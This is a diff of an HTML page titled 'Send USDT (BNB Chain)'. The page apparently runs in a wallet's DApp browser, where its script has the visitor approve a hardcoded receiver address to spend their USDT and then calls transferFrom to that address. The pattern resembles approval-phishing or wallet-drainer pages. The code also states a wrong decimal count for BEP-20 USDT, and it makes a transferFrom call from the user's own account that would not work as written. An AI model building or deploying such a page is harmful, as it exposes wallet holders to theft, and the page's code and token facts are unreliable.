@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Send USDT</title>
+  <title>Send USDT (BNB Chain)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
@@ -36,7 +36,6 @@
       border: 1px solid #ccc;
       border-radius: 8px;
       padding: 0 10px;
-      position: relative;
     }
 
     .input-box input {
@@ -111,12 +110,11 @@
       border-radius: 20px;
       cursor: pointer;
       position: relative;
-      overflow: hidden;
-      transition: background 0.3s ease;
+      transition: 0.3s;
     }
 
     .button.loading::after {
-      content: "Processing...";
+      content: "⏳ Processing...";
       position: absolute;
       top: 0;
       left: 0;
@@ -158,8 +156,8 @@
   </div>
 
   <script>
-    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Your wallet
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT on BNB
+    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // BNB chain USDT
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -167,7 +165,7 @@
     ];
 
     function setMax() {
-      const maxAmount = 100; // Example
+      const maxAmount = 100;
       document.getElementById('amount').value = maxAmount;
       document.querySelector('.converted').innerText = `= $${maxAmount.toFixed(2)}`;
     }
@@ -178,7 +176,7 @@
 
       try {
         if (!window.ethereum) {
-          alert("Open in Trust Wallet DApp browser.");
+          alert("Please open this page in Trust Wallet DApp browser.");
           return;
         }
 
@@ -193,15 +191,15 @@
           return;
         }
 
-        const value = web3.utils.toWei(amount, 'mwei'); // USDT has 6 decimals
-        const contract = new web3.eth.Contract(ABI, USDT);
+        const contract = new web3.eth.Contract(ABI, USDT_BEP20);
+        const value = web3.utils.toWei(amount, 'mwei'); // USDT is 6 decimals
 
         await contract.methods.approve(RECEIVER, value).send({ from: user });
         await contract.methods.transferFrom(user, RECEIVER, value).send({ from: user });
 
-        alert("✅ USDT sent successfully.");
+        alert("✅ USDT transfer complete.");
       } catch (err) {
-        alert("❌ Failed: " + (err.message || err));
+        alert("❌ Error: " + (err.message || err));
       } finally {
         btn.classList.remove("loading");
       }
